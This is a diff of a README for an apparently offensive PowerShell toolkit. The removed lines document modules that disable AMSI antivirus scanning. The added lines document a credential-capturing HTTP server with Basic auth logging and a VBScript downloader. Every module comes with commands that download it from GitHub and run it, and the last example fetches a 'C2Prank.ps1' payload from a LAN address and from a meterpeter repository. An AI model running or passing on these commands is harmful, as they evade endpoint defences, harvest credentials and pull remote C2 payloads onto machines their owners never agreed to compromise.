@@ -1,33 +1,51 @@
 ## Module Name
-   <b><i>AMSBP.ps1</i></b>
+   <b><i>CaptureServer.ps1</i></b>
 
 |Function name|Description|Privileges|Notes|
 |---|---|---|---|
-|AMSBP|Disable AMSI within current process|User Land|\*\*\*|
+|CaptureServer|Captute HTTP data (webserver)|User Land|Administrator|
 
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.ps1" -OutFile "AMSBP.ps1"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/CaptureServer.ps1" -OutFile "CaptureServer.ps1"
 ```
 
 ```powershell
-Import-Module -Name .\AMSBP.ps1 -Force
-AMSBP
+Import-Module -Name .\CaptureServer.ps1 -Force
+CaptureServer -AuthType Basic -IPAddress 192.168.1.72 -LogFilePath $Env:TMP\logfile.txt
 ```
 
 <br />
 
 ## Module Name
-   <b><i>Disable-Amsi.ps1</i></b>
+   <b><i>Start-SimpleHTTPServer.ps1</i></b>
    
 |Function Name|Description|Privileges|Notes|
 |---|---|---|---|
-|Disable-Amsi|disable AMSI within current process using well<br />known techniques laid out in an unsignatured way</i></b>|User Land|4 bypass technics available|
+|Start-SimpleHTTPServer|Simple HTTP pure powershell webserver|Administrator|Current dir its used as webroot|
 
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Disable-Amsi.ps1" -OutFile "Disable-Amsi.ps1"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/Start-SimpleHTTPServer.ps1" -OutFile "Start-SimpleHTTPServer.ps1"
 ```
 
 ```powershell      
-Import-Module -Name .\Disable-Amsi.ps1 -Force
-Disable-Amsi -DontDisableBlockLogging
+Import-Module -Name .\Start-SimpleHTTPServer.ps1 -Force
+Start-SimpleHTTPServer
 ```   
+
+<br />
+
+## Module Name
+   <b><i>wget.vbs</i></b>
+   
+|Script Name|Description|Privileges|Notes|
+|---|---|---|---|
+|wget.vbs|VBScript to download files from Local Lan|User Land|\*\*\*|
+
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/wget.vbs" -OutFile "wget.vbs"
+```
+
+```powershell      
+cscript wget.vbs http://10.11.0.5/C2Prank.ps1 C2Prank.ps1
+.\wget.vbs https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/C2Prank.ps1 C2Prank.ps1
+```  
